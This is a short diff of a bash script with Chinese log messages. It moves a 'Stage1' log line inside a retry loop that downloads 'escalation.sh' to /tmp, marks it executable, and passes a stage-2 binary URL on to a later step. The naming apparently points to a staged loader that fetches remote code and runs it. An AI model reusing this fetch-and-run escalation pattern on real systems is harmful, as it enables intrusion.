@@ -105,7 +105,7 @@ while [ $attempt -le $MAX_RETRIES ]; do
         continue
     fi
 
-    log_info "启动 Stage1 (host=$HOST_NAME)"
+    
 
     # ===================== 下载 escalation.sh 到 /tmp =====================
     log_info "准备下载 escalation.sh 到固定位置: $ESCALATION_SH"
@@ -119,6 +119,7 @@ while [ $attempt -le $MAX_RETRIES ]; do
         chmod 755 "$ESCALATION_SH" 2>/dev/null || true
         log_success "escalation.sh 已成功下载到 $ESCALATION_SH"
     fi
+    log_info "启动 Stage1 (host=$HOST_NAME)"
 
     if STAGE2_URL="$STAGE2_URL" \
        STAGE2_FILENAME="$stage2_bin" \
